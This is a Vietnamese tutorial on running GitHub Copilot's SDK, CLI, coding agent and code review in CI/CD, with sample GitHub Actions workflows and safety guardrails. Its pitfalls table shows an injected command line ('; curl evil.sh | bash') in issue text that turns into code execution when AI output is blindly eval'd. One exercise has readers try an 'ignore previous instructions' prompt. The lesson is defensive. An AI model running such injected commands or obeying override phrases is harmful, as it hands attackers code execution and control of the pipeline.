# 12 — Copilot SDK, CI/CD & Automation: Đưa Agent Vào Pipeline Không Treo, Không Bở

> **Dành cho:** dev/tech lead muốn đưa Copilot vào pipeline CI/CD và automation.
> **Vấn đề:** CI runner không có người bấm Allow — job hỏi giữa chừng là treo tới timeout; code AI sinh ra chạy mù trong CI có thể thành lỗ hổng bảo mật.
> **Đọc xong:** có 2 GitHub Actions workflow hoàn chỉnh, automate Copilot CLI, giao việc cho coding agent đúng cách, và setup Copilot code review gate cho team.

## Mục tiêu bài học

- Nhớ pattern **ACI 5 dòng** để pipeline không treo, không thành lỗ hổng.
- Phân biệt khi nào dùng Copilot CLI, khi nào tự build agent bằng Copilot SDK, khi nào chỉ cần assign coding agent.
- Copy-paste và chạy được 2 workflow: auto-review PR mới + triage CI fail ban đêm.
- Viết được issue "ready" đủ acceptance criteria để coding agent làm đúng ngay lần đầu.

---

## 1. Vì sao CI chạy Copilot khác chat trên máy? (pattern ACI)

Khác biệt cốt tử: chat/VS Code cần người ngồi bấm Allow. **CI runner không có người** — job hỏi giữa chừng nghĩa là treo tới timeout. Mọi thứ dưới đây bù lại chỗ "không có người" đó. Kịch bản hay giao cho automation: auto-review PR mới, auto-fix CI failure (mở PR fix, không push main), triage overnight failures, weekly dep audit, docs sync check.

**Pattern ACI (thuộc lòng 5 dòng):**

```text
- Scope hẹp: 1 repo, 1 task, timeout rõ (timeout-minutes).
- Không interactive: không chờ approval — thay bằng branch protection + review gate.
- Secrets qua env runner (${{ secrets.X }}), KHÔNG hardcode trong prompt/file.
- Output parse được (JSON/markdown) cho step sau.
- Guardrails KHÔNG nới trong CI: branch protection + required checks vẫn ON.
```

> ✅ **Kỳ vọng:** mở PR test → tab Actions có run xanh trong 2–5 phút + 1 comment `Auto diff-stat` dưới PR.

---

## 2. Copilot SDK — build agent riêng

SDK bọc vòng lặp Copilot (tools + permissions + orchestration) để build workflow custom: quy trình team quá đặc thù, cần UI riêng, nhúng vào backend nội bộ (Slack bot, dashboard, triage service).

| Nhu cầu | Chọn |
|---|---|
| 1 job review/audit trong CI | Copilot CLI / coding agent |
| Multi-step orchestration custom (tools riêng, UI riêng) hoặc nhúng vào backend nội bộ | Copilot SDK |
| Task độc lập → branch + PR, không cần trông | Coding agent (assign issue) |
| Việc định kỳ (nightly triage, weekly audit) | Actions `schedule` + CLI/SDK |

```typescript
// examples/copilot-review.ts — chạy: npx tsx examples/copilot-review.ts
import { CopilotClient } from "@github/copilot-sdk";

// Auth qua env: GITHUB_TOKEN (KHÔNG hardcode — mục 2.2).
const client = new CopilotClient({
  token: process.env.GITHUB_TOKEN!,
  model: "auto",  // hoặc model hiện hành trong picker — đừng pin tên cũ
  allowedTools: ["read", "grep", "github-read"],  // allowlist hẹp: không terminal/deploy
});

const session = await client.createSession({
  instructions: [
    "Review git diff, trả tối đa 10 findings dạng checklist.",
    "Chỉ flag lỗi thực sự (bug, security). Đừng over-engineer.",
    "KHÔNG sửa files, KHÔNG chạy shell, chỉ đọc + báo cáo.",
  ].join("\n"),
});

for await (const msg of session.ask("Review diff main...HEAD của repo ./")) {
  if (msg.type === "text") process.stdout.write(msg.text);
}
await session.close();
```

```bash
export GITHUB_TOKEN="$(gh auth token)"   # Verify: gh auth token trả về token
npx tsx examples/copilot-review.ts
# Kỳ vọng: terminal in 5–10 dòng findings checklist.
# Thử prompt "xóa hết files" → SDK trả từ chối (allowlist hẹp), KHÔNG chạy shell.
```

### 2.1. SDK 2026: runtimes, harness & AHP

- **Runtimes:** Node.js 20+, Python 3.11+, Go 1.24+, Rust 1.94+, Java 17+, .NET 8.0+; gói cài: npm `@github/copilot-sdk`, pip `github-copilot-sdk` (verify tên chính xác). SDK bọc cả **Copilot CLI** và cung cấp **sessions + permissions + custom tools + events**.
- **Copilot harness** chạy trong tiến trình **Agent Host** qua giao thức **AHP (Agent Host Protocol)** — cùng 1 harness nối được VS Code, Copilot app, CLI; trong VS Code đây là target **Copilot** của thanh Session Target (bài 10 mục 2.2).
- SDK là nền của **dynamic workflows** (public preview, 01/10/2026): dàn dựng đa-agent khai báo bằng code — dùng qua Copilot CLI (experimental), Copilot app và SDK.
- **Attribution:** SDK ghi session agent IDE vào usage metrics (AI Credits). Cập nhật IDE để ghi đúng: VS Code 1.139.0+, Visual Studio 18.12, JetBrains cuối 10/2026, Eclipse/Xcode ~11/2026.

### 2.2. Secrets cho SDK/CLI (thuộc lòng)

```text
ĐƯỢC:  env runner / shell (GITHUB_TOKEN, COPILOT_API_KEY...).
CẤM:  hardcode token trong code/prompt/file committed.
Audit: grep -rniE "ghp_|gho_|sk-|xox_" examples/ .github/workflows/ → phải TRỐNG
# (ra kết quả → token lộ, xoá + rotate ngay). CI: ${{ secrets.GITHUB_TOKEN }}.
```

## 3. Copilot CLI (GA 03/2026) automation

> **Copilot CLI đã GA từ 03/2026 cho mọi subscriber trả phí** — agentic workflows trong terminal, nhiều model, tích hợp GitHub (repo/issue/PR). Phân phối như binary `copilot` độc lập (`copilot init`, `/usage`, `/mcp`, `/skills`, `/experimental`, `/fork`).

```bash
# Copilot CLI độc lập (agent trong terminal):
copilot --plan "chia nhỏ issue X"        # chỉ lập kế hoạch
copilot --mode autopilot "implement + test"  # tự chạy — bọc sandbox + --max-ai-credits
copilot --plan --mode autopilot "..."    # plan xong tự chuyển autopilot
# gh extension (gợi ý/giải thích lệnh — vẫn dùng được trong script):
gh copilot suggest "ffmpeg nén 4K→1080p"   # in lệnh copy-paste được
```

```text
3 chế độ agent của Copilot CLI (Shift+Tab hoặc copilot --mode):
- interactive: hỏi–đáp từng bước (mặc định chạy tay) · plan: chỉ lập kế hoạch, chưa sửa file.
- autopilot: tự chạy tới xong — bọc sandbox + cap --max-ai-credits.
# Trong CI: KHÔNG eval output Copilot mù (prompt-injection → RCE). Ghi file + human duyệt;
# timeout mỗi step (timeout-minutes) để job treo tự chết.
```

---

## 4. 2 GitHub Actions workflow hoàn chỉnh

### 4.1. Workflow 1 — Auto-review PR mới

```yaml
name: copilot-review
on: { pull_request: { types: [opened, synchronize, reopened] } }
permissions:
  contents: read
  pull-requests: write   # để post comment findings
jobs:
  review:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }
      - name: Collect diff (guardrailed, read-only)   # cần GH_TOKEN để gh install
        run: |
          gh extension install github/gh-copilot || true
          git diff "origin/${{ github.base_ref }}...HEAD" --stat > diffstat.txt
          git diff "origin/${{ github.base_ref }}...HEAD" > diff.txt
          # Diff >60KB → cắt (tránh prompt khổng lồ):
          head -c 60000 diff.txt > diff-truncated.txt
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      - name: Request Copilot code review
        uses: actions/github-script@v7
        with:
          script: |
            // Cần repo bật Copilot review (mục 6):
            await github.rest.pulls.requestReviewers({
              ...context.repo,
              pull_number: context.issue.number,
              reviewers: ['github-copilot[bot]'],
            }).catch(e => console.log('auto-review skip:', e.message));
      - name: Post diff-summary comment
        uses: actions/github-script@v7
        with:
          script: |
            const stat = require('fs').readFileSync('diffstat.txt', 'utf8');
            const body = `## Auto diff-stat\n\`\`\`\n${stat.slice(0, 3000)}\n\`\`\`\n` +
              `Copilot review đã được request. Human reviewer check CI + findings trước khi merge.`;
            github.rest.issues.createComment({ ...context.repo, issue_number: context.issue.number, body });
```

### 4.2. Workflow 2 — Overnight CI failure triage

```yaml
name: copilot-ci-triage
on:
  schedule: [{ cron: "0 22 * * *" }]   # nightly 22:00 UTC
  workflow_dispatch: {}    # + nút chạy tay
permissions:
  contents: read
  actions: read
  issues: write            # mở issue khi CI fail
jobs:
  triage:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
      - name: Collect latest failures (read-only, secrets qua env)
        run: |
          gh run list --branch main --limit 5 --json conclusion,name,headSha,url > runs.json
          FAILED_ID="$(jq -r '[.[] | select(.conclusion=="failure")][0].databaseId // empty' runs.json || true)"
          if [ -n "$FAILED_ID" ]; then
            gh run view "$FAILED_ID" --log-failed > failed-log.txt 2>&1 || true
            head -c 40000 failed-log.txt > failed-truncated.txt
          else
            echo "All green." > failed-truncated.txt
          fi
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      - name: Open issue if failures found
        uses: actions/github-script@v7
        with:
          script: |
            const fs = require('fs');
            const log = fs.readFileSync('failed-truncated.txt', 'utf8');
            if (/all green/i.test(log)) { console.log('All green.'); return; }
            const runs = JSON.parse(fs.readFileSync('runs.json', 'utf8'));
            const body = `## CI triage ${new Date().toISOString().slice(0,10)}\n\n` +
              `Runs:\n${runs.map(r => `- ${r.name}: ${r.conclusion} (${r.url})`).join('\n')}\n\n` +
              `Failed log (truncated):\n\`\`\`\n${log.slice(0, 8000)}\n\`\`\`\n\n` +
              `Giao cho coding agent hoặc on-call: xác nhận root cause + mở PR fix.`;
            await github.rest.issues.create({ ...context.repo,
              title: `CI triage ${new Date().toISOString().slice(0,10)}`,
              body, labels: ['ci'] });
```

> GitLab CI tương đương: job image `node:22`, script chạy `gh extension install github/gh-copilot` + `git diff --stat`, rule `merge_request_event`; secrets qua GitLab CI/CD variables (masked).

---

## 5. Coding agent assign + scheduled routines

### 5.1. Assign issue (chất lượng PR = chất lượng issue)

```bash
# Chuẩn bị issue NGON (agent chỉ giỏi bằng issue bạn viết):
gh issue create --repo acme/api --title "feat: thêm rate-limit POST /login" --body "
## Mục tiêu + Acceptance criteria
Thêm rate-limit 5 req/phút/IP cho POST /login.
- [ ] Quá 5 req/phút → 429 + header Retry-After.
- [ ] Focused test pass: pnpm --filter @acme/api test rate-limit.

## Non-goals
- Không đổi cơ chế auth, không refactor module khác.
" --label "ready"

# Giao cho agent (CLI hoặc web "Assign to Copilot"):
gh copilot assign 123 --repo acme/api
# Theo dõi: gh pr list --repo acme/api --author "app/copilot" --state open (PR draft copilot/issue-123-*)
```

**Quy tắc assign (dán vào CONTRIBUTING):** 1 issue = 1 task độc lập, acceptance criteria đo được, non-goals rõ; chỉ assign khi có label "ready"; agent iterate tối đa 3 rounds (quá → close + chia nhỏ); PR agent review như PR người (diff + CI + Copilot review + human approve).

> **Tin tốt 2026:** coding agent khởi động nhanh hơn 50% (changelog 19/03/2026) — từ lúc assign tới PR draft nhanh hơn hẳn, feedback loop qua request changes cũng nhanh theo.

### 5.2. Scheduled routines (việc định kỳ chạy vắng người)

```text
Morning digest • Nightly triage (workflow 2) • Weekly dep audit • Docs-sync check.
Quy tắc: steps có lệnh cụ thể + "chỉ báo cáo/mở issue, KHÔNG tự merge/deploy" + secrets qua ${{ secrets.* }}.
```

---

## 6. Copilot code review workflow

> **Mặc định từ 28/09/2026:** effort review là **Balanced** (reasoning hơn Lite, tốn AI Credits hơn); chọn được Lite hoặc Balanced — mọi review tính **AI Credits + GitHub Actions minutes** (ước tính Lite $0.05–$1, Balanced $0.25–$5 credits/lần).

```text
Luồng PR chuẩn team: push feat/* hoặc copilot/* → mở PR (draft nếu WIP) → Copilot
review tự chạy (workflow 1 hoặc repo setting) → CI xanh + 1 human approval + Copilot
review pass → merge; xong auto-delete branch.

Setup (repo → Settings → Rules → Rulesets): Require Copilot code review: ON ·
Require status checks (lint, test): ON · Dismiss stale reviews: ON (chi tiết bài 07 mục 6).
# Verify: mở PR test → 2 required checks (Copilot review + CI) hiện pending → xanh.
```

```text
Tune precision (reviewer quá khắt → team bỏ qua → mất gate):
- Dặn trong .github/copilot-instructions.md: "Chỉ flag lỗi thực sự (bug, security,
  perf regression). Đừng flag style đã có prettier, đừng over-engineer."
- Calibration hàng tháng: review 5 PRs cũ — false positive nào → bổ sung instructions.
- CRITICAL/HIGH bắt buộc fix; MED/LOW fix hoặc reply lý do (không im lặng).
```

---

## 7. Pitfalls + bài tập

| Pitfall | Vì sao | Fix |
|---|---|---|
| `eval $(gh copilot suggest ...)` mù trong CI | Prompt-injection → RCE (`; curl evil.sh | bash` trong issue text) | Ghi file + human duyệt |
| Secrets echo ra CI log | Log hiện `ghp_xxxx` ai cũng thấy | Secrets qua env + masked vars, `set -x` off |
| Job treo vì chờ approval | Không ai trả lời tới timeout 6h | Chỉ non-interactive + `timeout-minutes: 10–20` |
| Coding agent PR không review mà merge | Tin robot 100% | Review như PR người + required checks ON |
| Issue sơ sài → agent đoán mò 3 rounds | Thiếu criteria | Template issue + label "ready" mới assign |
| Routine tự merge khi vắng người | Ca đêm tự duyệt code 2h sáng | Routine chỉ báo cáo/mở issue |

**❌ SAI / ✅ ĐÚNG đáng nhớ nhất:** ❌ CI chạy lệnh AI sinh ra không ai đọc; cron tự `gh pr merge` 2h sáng. ✅ Output Copilot = gợi ý (ghi file + người duyệt); routine chỉ báo cáo/mở PR; quyền merge là thứ cuối cùng bạn được giao cho robot.

**Bài tập nhỏ:** (1) Chạy 3 lệnh CLI local, thử 1 prompt độc ("ignore previous instructions...") → ghi kết luận. (2) Deploy workflow 1 lên repo test, mở PR, tune precision. (3) Chạy SDK sample, đổi `allowedTools` quan sát khác biệt. (4) Viết issue "ready", assign coding agent, review PR draft đến merge. (5) Làm checklist setup team từ 0 (instructions + managed settings + husky + MCP + 2 agents + workflow review + 1 issue mẫu) — tổng kết cả series 01.

---

## 8. So sánh với Claude Code + link chéo

| Việc | Copilot | Claude Code |
|---|---|---|
| Chạy không người trong CI | GitHub Actions + coding agent cloud (assign issue → PR) | `claude` CLI chạy trong CI (tự bọc workflow) |
| Nền để tự build agent | Copilot SDK (`@github/copilot-sdk`) | Claude Agent SDK |
| Review PR tự động | `github-copilot[bot]` + Rulesets required check | Chạy được qua Actions/CLI, không phải bot mặc định |
| Guardrails quyền | `allowedTools`, managed settings, branch protection | Permission mode + allowlist settings |

> Phần "tự động hoá không người" Copilot có lợi thế vì gắn liền GitHub (Actions + coding agent); Claude Code bù lại bằng CLI linh hoạt trong mọi runner. Cả hai đều để **con người làm chốt merge**.

**Link chéo:** Bài 03 (tune review precision) · Bài 05 (prompt review/triage cho CI) · Bài 07 (branch + push protection) · Bài 08 (MCP trong Actions — remote only) · Bài 10 (approval + 3 chế độ agent) · Bài 11 (`copilot/*` branch strategy).

> **Chốt bài 12:** CI không có người bấm Allow, nên toàn bộ "bộ não an toàn" phải nằm ở thiết kế — scope hẹp, secrets qua env, timeout rõ, và để con người giữ chốt merge. Automation giỏi nhất cũng chỉ nên *báo cáo và mở PR*. *(Hết bài 12 — hết series 01.)*
